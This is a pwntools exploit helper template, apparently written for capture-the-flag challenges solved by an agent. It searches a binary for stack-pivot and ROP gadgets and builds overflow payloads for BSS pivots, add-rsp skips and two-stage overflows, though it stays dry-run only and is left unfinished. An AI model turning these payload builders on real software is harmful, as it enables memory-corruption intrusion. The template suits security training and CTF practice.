#!/usr/bin/env python3
from pwn import *
import os, re

BIN = os.getenv("BIN", "./chall")
LIBC = os.getenv("LIBC", "./libc.so.6")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
OFFSET = int(os.getenv("OFFSET", "0"))
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None
context.log_level = os.getenv("LOG", "info")

def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def emit(data: bytes):
    print(data.decode(errors="replace"))
    m = re.search(FLAG_RE, data)
    if m:
        flag = m.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


# Find stack pivot gadgets
# Common patterns: leave; ret, mov rsp, rbp; pop rbp; ret, add rsp, X; ret
pivot_gadgets = {}

# leave; ret (most common pivot)
for addr in elf.search(b"\xc9\xc3"):  # leave; ret
    pivot_gadgets["leave_ret"] = addr
    log.info(f"Found leave; ret at {addr:#x}")
    break

# mov rsp, rbp; pop rbp; ret (alternative pivot)
for addr in elf.search(b"\x48\x89\xec\x5d\xc3"):  # mov rsp, rbp; pop rbp; ret
    pivot_gadgets["mov_rsp_rbp"] = addr
    log.info(f"Found mov rsp, rbp; pop rbp; ret at {addr:#x}")
    break

# xchg rsp, rax; ret (if rax points to controlled buffer)
for addr in elf.search(b"\x48\x94\xc3"):  # xchg rsp, rax; ret
    pivot_gadgets["xchg_rsp_rax"] = addr
    log.info(f"Found xchg rsp, rax; ret at {addr:#x}")
    break

# add rsp, X; ret (small pivot)
for offset in [0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 0x90, 0xa0, 0xb0, 0xc0]:
    pattern = b"\x48\x83\xc4" + bytes([offset]) + b"\xc3"  # add rsp, X; ret
    for addr in elf.search(pattern):
        pivot_gadgets[f"add_rsp_{offset:#x}"] = addr
        log.info(f"Found add rsp, {offset:#x}; ret at {addr:#x}")
        break

# Find useful ROP gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0] if rop.find_gadget(["pop rdi", "ret"]) else None
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0] if rop.find_gadget(["pop rsi", "ret"]) else None
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0] if rop.find_gadget(["pop rdx", "ret"]) else None
ret = rop.find_gadget(["ret"])[0] if rop.find_gadget(["ret"]) else None

log.info(f"pop rdi: {pop_rdi:#x}" if pop_rdi else "pop rdi: not found")
log.info(f"pop rsi: {pop_rsi:#x}" if pop_rsi else "pop rsi: not found")
log.info(f"pop rdx: {pop_rdx:#x}" if pop_rdx else "pop rdx: not found")
log.info(f"ret: {ret:#x}" if ret else "ret: not found")


def stack_pivot_to_bss(controlled_data):
    """
    Pivot stack to BSS where we control the data.
    
    This is useful when:
    - Stack buffer overflow is small but BSS is large and controllable
    - Need more space for complex ROP chains
    - Stack has limited write primitives
    
    controlled_data should be the address in BSS where ROP chain lives.
    """
    if "leave_ret" not in pivot_gadgets:
        log.error("leave; ret gadget required for stack pivot")
        return None
    
    # Strategy: 
    # 1. First overflow sets rbp to controlled_data (partial overwrite or known address)
    # 2. Return to leave; ret which does: mov rsp, rbp; pop rbp; ret
    # 3. Now rsp points to controlled_data, continues ROP from there
    
    leave_ret = pivot_gadgets["leave_ret"]
    
    # First stage: pivot to controlled_data
    # We need: [padding] [new_rbp] [leave_ret]
    # After leave: rsp = new_rbp, pops rbp from [new_rbp], returns to [new_rbp+8]
    first_stage = flat({
        OFFSET: [
            controlled_data,  # rbp -> will become new rsp after leave
            leave_ret,        # return address -> triggers pivot
        ]
    })
    
    return first_stage


def stack_pivot_add_rsp(offset, rop_chain):
    """
    Use add rsp, X; ret to pivot past controlled data.
    
    Useful when:
    - Overflow lands in a controlled buffer
    - Need to skip some bytes to align ROP chain
    - Combining with other techniques
    """
    if f"add_rsp_{offset:#x}" not in pivot_gadgets:
        log.error(f"add rsp, {offset:#x}; ret gadget not found")
        return None
    
    add_rsp = pivot_gadgets[f"add_rsp_{offset:#x}"]
    
    # The pivot will add offset to rsp, then return to whatever is at new rsp
    # Layout: [padding] [add_rsp] [junk of size offset-8] [rop_chain]
    first_stage = flat({
        OFFSET: [
            add_rsp,
            b"B" * (offset - 8),  # Skip these bytes
            rop_chain,            # Actual ROP chain starts here
        ]
    })
    
    return first_stage


def two_stage_overflow_pivot(pivot_target, first_overflow_size, rop_chain):
    """
    Two-stage overflow approach:
    1. First overflow: overwrite saved rbp with pivot_target
    2. Second overflow: write ROP chain at pivot_target
    
    Requires two overflows or a loop in the program.
    """
    if "leave_ret" not in pivot_gadgets:
        log.error("leave; ret gadget required")
        return None
    
    leave_ret = pivot_gadgets["leave_ret"]
    
    # First stage payload
    first_payload = flat({
        first_overflow_size - 8: [  # Overwrite up to saved rbp
            pivot_target,     # New rbp
            leave_ret,        # Return to leave; ret
        ]
    })
    
    # Second stage payload (at pivot_target)
    second_payload = rop_chain
    
    return first_payload, second_payload


if __name__ == "__main__":
    log.info("Stack pivot helper template loaded")
    log.info(f"Available pivot gadgets: {list(pivot_gadgets.keys())}")

    if not pivot_gadgets:
        log.error("No pivot gadgets found")
        log.info("Try: ROPgadget --binary ./chall | grep -E 'leave|mov rsp|add rsp'")
        raise SystemExit("TODO: find or construct a verified pivot gadget")

    log.info("Do not execute a pivot route until the pivot target, post-pivot chain, and write path are all proven.")
    log.info("Suggested modes: bss / add_rsp / two_stage; keep this file as a helper, not a blind launcher.")

    if os.getenv("RUN", "0") != "1":
        raise SystemExit("Dry-run only. Set RUN=1 only after validating the pivot target and post-pivot chain.")

    raise SystemExit("TODO: implement the verified pivot sequence for this binary")
